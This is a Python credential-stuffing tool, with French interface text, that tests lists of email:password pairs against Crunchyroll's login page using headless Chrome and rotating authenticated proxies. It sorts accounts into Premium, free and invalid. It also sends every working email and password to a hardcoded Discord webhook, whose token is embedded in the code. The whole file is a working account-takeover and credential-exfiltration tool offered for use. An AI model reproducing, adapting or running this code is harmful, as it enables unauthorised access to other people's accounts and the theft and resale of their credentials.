import os
import time
import random
import threading
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from concurrent.futures import ThreadPoolExecutor

# Remplace par ton webhook Discord ici
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1380946363142897725/jkK6xwck0hz_xdSOeaPDufowswbCRolk1vwDJCGImI3sbslECLGyt_Kb4H_JsZd-g-iR"

class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

valid = 0
custom = 0
invalid = 0
lock = threading.Lock()

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.BLUE} _______   _______   ________   ___.             ___.    .__                                            
\\   _  \\  \\   _  \\  \\_____  \\  \\_ |__   ___.__. \\_ |__  |  |   __ __   ____     ____    ____    ____  
/  /_\\  \\ /  /_\\  \\   _(__  <   | __ \\ <   |  |  | __ \\ |  |  |  |  \\_/ __ \\   / ___\\ _/ __ \\  /    \\ 
\\  \\_/   \\\\  \\_/   \\ /       \\  | \\_\\ \\ \\___  |  | \\_\\ \\|  |__|  |  /\\  ___/  / /_/  >\\  ___/ |   |  \\
 \\_____  / \\_____  //______  /  |___  / / ____|  |___  /|____/|____/  \\___  > \\___  /  \\___  >|___|  /
       \\/        \\/        \\/       \\/  \\/           \\/                   \\/ /_____/       \\/      \\/
                                 Checker Crunchyroll / discord.gg/bluegen
{Colors.RESET}
    """
    print(banner)

def load_file(filename):
    if not os.path.exists(filename):
        return []
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def append_to_file(filename, content):
    with open(filename, 'a') as f:
        f.write(content + "\n")

def add_accounts():
    clear_console()
    print(f"{Colors.BLUE}Ajout de comptes (email:password), une par ligne. Vide pour finir.{Colors.RESET}")
    while True:
        line = input("Compte: ").strip()
        if line == "":
            break
        if ':' not in line:
            print(f"{Colors.RED}Format invalide, utilise email:password{Colors.RESET}")
            continue
        append_to_file("accounts.txt", line)
        print(f"{Colors.GREEN}Compte ajouté.{Colors.RESET}")

def add_proxies():
    clear_console()
    print(f"{Colors.BLUE}Ajout de proxys (format IP:PORT ou USER:PASSWORD@IP:PORT), un par ligne. Vide pour finir.{Colors.RESET}")
    while True:
        line = input("Proxy: ").strip()
        if line == "":
            break
        append_to_file("proxies.txt", line)
        print(f"{Colors.GREEN}Proxy ajouté.{Colors.RESET}")

def create_proxy_auth_extension(host, port, user, password):
    import zipfile
    from tempfile import mkdtemp

    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth Extension",
        "permissions": [
            "proxy", "tabs", "unlimitedStorage", "storage", "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        }
    }
    """
    background_js = f"""
    var config = {{
            mode: "fixed_servers",
            rules: {{
            singleProxy: {{
                scheme: "http",
                host: "{host}",
                port: parseInt({port})
            }},
            bypassList: ["localhost"]
            }}
        }};
    chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
    chrome.webRequest.onAuthRequired.addListener(
        function(details) {{
            return {{
                authCredentials: {{
                    username: "{user}",
                    password: "{password}"
                }}
            }};
        }},
        {{urls: ["<all_urls>"]}},
        ['blocking']
    );
    """

    temp_dir = mkdtemp()
    path = os.path.join(temp_dir, "proxy_auth_plugin.zip")
    with zipfile.ZipFile(path, 'w') as zp:
        zp.writestr("manifest.json", manifest_json)
        zp.writestr("background.js", background_js)

    return path

def get_proxy_options(proxy):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    if proxy and "@" in proxy:
        creds, address = proxy.split("@")
        user, pwd = creds.split(":")
        host, port = address.split(":")
        chrome_options.add_argument(f'--proxy-server=http://{host}:{port}')
        chrome_options.add_extension(create_proxy_auth_extension(host, port, user, pwd))
    elif proxy:
        chrome_options.add_argument(f'--proxy-server=http://{proxy}')
    
    return chrome_options

def send_to_webhook(email, password, status):
    data = {
        "content": f"**Compte {status}**\nEmail: `{email}`\nMot de passe: `{password}`"
    }
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=data)
        if response.status_code != 204:
            print(f"{Colors.RED}Erreur webhook Discord : {response.status_code}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}Erreur en envoyant webhook : {e}{Colors.RESET}")

def check_account(email, password, proxy_list):
    global valid, custom, invalid
    proxy = random.choice(proxy_list) if proxy_list else None
    chrome_options = get_proxy_options(proxy) if proxy else Options()
    if not proxy:
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--log-level=3")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])
        chrome_options.add_experimental_option('useAutomationExtension', False)

    try:
        service = Service(ChromeDriverManager().install(), log_path=os.devnull)
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(20)
        driver.get("https://www.crunchyroll.com/login")
        time.sleep(2)

        try:
            email_field = driver.find_element(By.NAME, "email")
            password_field = driver.find_element(By.NAME, "password")
        except:
            with lock:
                print(f"{Colors.YELLOW}[⚠️] Erreur (login bloqué) → {email}{Colors.RESET}")
                append_to_file("invalid.txt", f"{email}:{password}")
                invalid += 1
            return

        email_field.send_keys(email)
        password_field.send_keys(password)
        password_field.send_keys(Keys.ENTER)
        time.sleep(4)

        if "login" not in driver.current_url:
            driver.get("https://www.crunchyroll.com/account/membership")
            time.sleep(2)
            page = driver.page_source.upper()
            with lock:
                if "PREMIUM" in page:
                    print(f"{Colors.GREEN}[✅] Valide → {email}{Colors.RESET}")
                    append_to_file("valid.txt", f"{email}:{password}")
                    send_to_webhook(email, password, "Valid")
                    valid += 1
                else:
                    print(f"{Colors.YELLOW}[🟡] Custom (sans abo) → {email}{Colors.RESET}")
                    append_to_file("custom.txt", f"{email}:{password}")
                    send_to_webhook(email, password, "Custom")
                    custom += 1
        else:
            with lock:
                print(f"{Colors.RED}[❌] Invalide → {email}{Colors.RESET}")
                append_to_file("invalid.txt", f"{email}:{password}")
                invalid += 1
    except Exception:
        with lock:
            print(f"{Colors.YELLOW}[⚠️] Erreur proxy ou chargement → {email}{Colors.RESET}")
            append_to_file("invalid.txt", f"{email}:{password}")
            invalid += 1
    finally:
        try:
            driver.quit()
        except:
            pass

def launch_checker():
    global valid, custom, invalid
    valid = custom = invalid = 0

    accounts = load_file("accounts.txt")
    if not accounts:
        print(f"{Colors.RED}Aucun compte dans accounts.txt, ajoute en avant de lancer.{Colors.RESET}")
        input("Appuie sur Entrée...")
        return

    proxies = load_file("proxies.txt")

    # Reset fichiers résultat
    for file in ["valid.txt", "invalid.txt", "custom.txt"]:
        with open(file, "w") as f:
            f.write("")

    max_workers = 5

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for acc in accounts:
            if ':' not in acc:
                continue
            email, password = acc.split(":", 1)
            executor.submit(check_account, email, password, proxies)

    print(f"\n{Colors.BLUE}--- RÉSUMÉ FINAL ---{Colors.RESET}")
    print(f"{Colors.GREEN}✅ Valides (Premium) : {valid}{Colors.RESET}")
    print(f"{Colors.YELLOW}🟡 Custom (Sans abo) : {custom}{Colors.RESET}")
    print(f"{Colors.RED}❌ Invalides : {invalid}{Colors.RESET}")
    print(f"{Colors.BLUE}🔢 Total testé : {valid + custom + invalid}{Colors.RESET}")
    input("Appuie sur Entrée pour quitter...")

def main_menu():
    while True:
        clear_console()
        print_banner()
        print(f"{Colors.BLUE}1.{Colors.RESET} Ajouter des comptes")
        print(f"{Colors.BLUE}2.{Colors.RESET} Ajouter des proxys")
        print(f"{Colors.BLUE}3.{Colors.RESET} Lancer le checkeur")
        print(f"{Colors.BLUE}4.{Colors.RESET} Quitter")
        choice = input("Choix: ").strip()
        if choice == "1":
            add_accounts()
        elif choice == "2":
            add_proxies()
        elif choice == "3":
            launch_checker()
        elif choice == "4":
            break
        else:
            print(f"{Colors.RED}Choix invalide.{Colors.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
